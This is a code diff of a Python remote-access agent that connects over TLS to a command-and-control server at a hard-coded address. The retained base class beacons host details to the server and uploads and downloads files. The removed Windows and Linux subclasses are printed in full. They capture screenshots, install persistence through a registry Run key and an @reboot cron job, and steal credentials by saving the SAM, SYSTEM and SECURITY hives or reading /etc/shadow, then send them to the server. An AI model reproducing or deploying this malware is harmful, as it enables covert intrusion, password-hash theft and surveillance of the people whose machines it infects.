@@ -1,17 +1,16 @@
-import socket, ssl, threading, sys, os, subprocess
-import secrets, platform, uuid, datetime
-import shutil, hashlib, mss, mss.tools
+import socket, ssl, threading, os, subprocess
+import platform, uuid, datetime
+import hashlib
 from getpass import getuser
-from time import sleep
 
-if platform.system() == "Windows":
-    import winreg
-
-ERROR_INSUFFICIENT_PERMS = b'\x98\x90\x90\x30\x22\x11'
-SIG_EOF = b'\x4F\x4F\x4E\x4F\x01'
-FILE_NOT_FOUND = b'\x01\x23\x45\x67\x89'
+from symbols import *
 
 class Client:
+
+    ####################################################################################################################
+    ################################################# CONSTRUCTOR ######################################################
+    ####################################################################################################################
+
     def __init__(self, server_address, server_port):
         self.server_address = server_address
         self.server_port = server_port
@@ -33,6 +32,10 @@ class Client:
         }
         self.agent_path = None
         self.is_killed = False
+
+    ####################################################################################################################
+    ########################################### CONNECTION HANDLING ####################################################
+    ####################################################################################################################
     
     def connect(self):
         context = ssl.create_default_context()
@@ -49,10 +52,7 @@ class Client:
             self.secure_sock.sendall(information_json.encode())
 
             self.receive_commands()
-
-        except ssl.SSLError as e:
-            pass
-        except Exception as e:
+        except Exception:
             pass
         finally:
             self.secure_sock.close()
@@ -78,6 +78,23 @@ class Client:
                     break
             except Exception as e:
                 break
+
+    ####################################################################################################################
+    ############################################## USUAL METHODS #######################################################
+    ####################################################################################################################
+
+    def getJSONHostInfos(self):
+        return f"{{\"hostname\": \"{self.hostname}\", \"user\": \"{self.user}\", \"mac\": \"{self.mac}\", \"uid\": \"{self.uid}\", \"timestamp\": \"{datetime.datetime.now()}\", \"os\": \"{platform.system()}\"}}"
+
+    def getClientUID(self):
+        """Create a UID combining the hostname the mac address and the user running the agent"""
+        string = f"{self.hostname}{self.mac}{self.user}"
+        hostUID = hashlib.sha256(string.encode()).hexdigest()
+        return hostUID[:8]
+
+    ####################################################################################################################
+    ########################################### CLIENT COMMANDS ########################################################
+    ####################################################################################################################
 
     def kill(self, args):
         self.secure_sock.close()
@@ -115,7 +132,7 @@ class Client:
         for file_path in args:
             try:
                 with open(file_path, 'rb') as f:
-                    while (chunk := f.read(4096)):
+                    while chunk := f.read(4096):
                         self.secure_sock.sendall(chunk)
                 self.secure_sock.sendall(SIG_EOF)
             except Exception as e:
@@ -127,23 +144,14 @@ class Client:
                 while True:
                     data = self.secure_sock.recv(4096)
                     decoded_data = data.decode("latin1")
-                    if (data == SIG_EOF) or (not data):
+                    if data == SIG_EOF or not data:
                         break
-                    if (data == FILE_NOT_FOUND):
+                    if data == FILE_NOT_FOUND:
                         os.remove(f)
                         return
                     f.write(data)
         except Exception as e:
             return
-    
-    def getJSONHostInfos(self):        
-        return f"{{\"hostname\": \"{self.hostname}\", \"user\": \"{self.user}\", \"mac\": \"{self.mac}\", \"uid\": \"{self.uid}\", \"timestamp\": \"{datetime.datetime.now()}\", \"os\": \"{platform.system()}\"}}"
-
-    def getClientUID(self):
-        """Create a UID combining the hostname the mac address and the user running the agent"""
-        string = f"{self.hostname}{self.mac}{self.user}"
-        hostUID = hashlib.sha256(string.encode()).hexdigest()
-        return hostUID[:8]
 
     def hashdump(self, args):
         raise NotImplementedError("This method should be implemented by subclasses")
@@ -165,173 +173,3 @@ class Client:
     def ipconfig(self, args):
         raise NotImplementedError("This method should be implemented by subclasses")
 
-
-class WindowsClient(Client):
-    def __init__(self, server_address, server_port):
-        super().__init__(server_address, server_port)
-    
-    def screenshot(self, args):
-        appdata = os.getenv('APPDATA')
-        screen_path = os.path.join(appdata, f"{secrets.token_hex(5)}.jpg")
-
-        with mss.mss() as sct:
-            screenshot = sct.grab(sct.monitors[0])
-            mss.tools.to_png(screenshot.rgb, screenshot.size, output=screen_path)
-        
-        with open(screen_path, 'rb') as f:
-            while (chunk := f.read(4096)):
-                self.secure_sock.sendall(chunk)
-        self.secure_sock.sendall(SIG_EOF)
-        os.remove(screen_path)
-
-    def persistence(self):
-        self.agent_path = os.path.join(os.getenv('APPDATA'), f"{self.uid}.exe")
-
-        # Check if Persistence is already in place
-        if os.path.exists(self.agent_path):
-            return 0
-
-        try:
-            shutil.copy2(sys.argv[0], self.agent_path)
-
-        except Exception as e:
-            return 1
-
-        # Add the exe to startup programs
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                            r"Software\Microsoft\Windows\CurrentVersion\Run",
-                            0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "Stryfe", 0, winreg.REG_SZ, self.agent_path)
-        winreg.CloseKey(key)
-
-    def send_file(self, path):
-        # if it exists
-        if os.access(path, os.F_OK):
-            # if user has permissions to read the file
-            if os.access(path, os.R_OK):
-                try:
-                    with open(path,'rb') as f:
-                        while (chunk := f.read(4096)):
-                            self.secure_sock.sendall(chunk)
-                    self.secure_sock.sendall(SIG_EOF)
-                except Exception as e:
-                    print("Error while sending file: ", e)
-                    self.secure_sock.sendall(f"ERROR:\n {str(e)}".encode())
-            else:
-                # Sending error code if user doesnt have permissions to dump hashes
-                self.secure_sock.sendall(ERROR_INSUFFICIENT_PERMS)
-            self.secure_sock.sendall(SIG_EOF)
-        else:
-            self.secure_sock.sendall(FILE_NOT_FOUND)
-
-    def delete_file(self, filepath):
-        try:
-            os.remove(filepath)
-        except Exception as e:
-            pass
-
-    def hashdump(self, args):
-        print("In hashdump windows client")
-        base_path = os.path.join('C:', 'Windows', 'Temp')
-        sam_path = os.path.join(base_path, 'sam')
-        system_path = os.path.join(base_path, 'system')
-        security_path = os.path.join(base_path, 'security')
-
-        # Delete files if they exist to avoid entering in interactive mode
-        self.delete_file(sam_path)
-        subprocess.run("reg save HKLM\\SAM %s" % sam_path, shell=True)
-        self.delete_file(system_path)
-        subprocess.run("reg save HKLM\\SYSTEM %s" % system_path, shell=True)
-        self.delete_file(security_path)
-        subprocess.run("reg save HKLM\\SECURITY %s" % security_path, shell=True)
-
-        print(f"Sending file {sam_path}")
-        self.send_file(sam_path)
-        print(f"Sending file {system_path}")
-        self.send_file(system_path)
-        print(f"Sending file {security_path}")
-        self.send_file(security_path)
-
-    def ipconfig(self, args):
-        output = subprocess.check_output("ipconfig /all", shell=True, text=True, encoding='utf-8', errors='ignore')
-        self.secure_sock.sendall(output.encode())
-
-
-class LinuxClient(Client):
-    def __init__(self, server_address, server_port):
-        super().__init__(server_address, server_port)
-
-    def screenshot(self, args):
-        screen_path = f"/tmp/{secrets.token_hex(5)}.jpg"
-
-        with mss.mss() as sct:
-            screenshot = sct.grab(sct.monitors[0])
-            mss.tools.to_png(screenshot.rgb, screenshot.size, output=screen_path)
-        
-        with open(screen_path, 'rb') as f:
-            while (chunk := f.read(4096)):
-                self.secure_sock.sendall(chunk)
-        self.secure_sock.sendall(SIG_EOF)
-        os.remove(screen_path)
-
-    def persistence(self):
-
-        self.agent_path = os.path.join(os.getenv('HOME'), f".{self.uid}")
-
-        try:
-            shutil.copy2(sys.argv[0], self.agent_path)
-
-        except Exception as e:
-            return 1
-
-        # Read whole current crontab
-        try:
-            crontab = subprocess.run(['crontab', '-l'], capture_output=True, text=True).stdout
-        except:
-            return 0
-        # Malicious cron for persistence
-        job = f"@reboot bash -c {self.agent_path}\n"
-        
-        # Check if cron already exist
-        if job not in crontab:
-            crontab = crontab + job
-            process = subprocess.run(['crontab', '-'], input=crontab, text=True)
-
-        # TODO Self removing the executable
-
-    def hashdump(self, args):
-        if os.access('/etc/shadow', os.R_OK):
-            try:
-                with open('/etc/shadow','rb') as f:
-                    while (chunk := f.read(4096)):
-                        self.secure_sock.sendall(chunk)
-                self.secure_sock.sendall(SIG_EOF)
-            except Exception as e:
-                self.secure_sock.sendall(f"ERROR:\n {str(e)}".encode())
-        else:
-            # Sending error code if user doesnt have permissions to dump hashes
-            self.secure_sock.sendall(ERROR_INSUFFICIENT_PERMS)
-
-    def ipconfig(self, args):
-        try:
-            output = subprocess.check_output("ip a", shell=True, text=True, encoding='utf-8', stderr=subprocess.STDOUT)
-        except subprocess.CalledProcessError as e:
-            output = e.output
-        finally:
-            self.secure_sock.sendall(output.encode())
-
-if __name__ == "__main__":
-    C2_IP = '192.168.1.62'
-    C2_PORT = 8888
-    if platform.system() == 'Windows':
-        client = WindowsClient(C2_IP, C2_PORT)
-        #client.persistence()
-    else:
-        client = LinuxClient(C2_IP, C2_PORT)
-        #client.persistence()
-    while not client.is_killed:
-        try:
-            client.connect()
-        except:
-            sleep(3)
-            continue
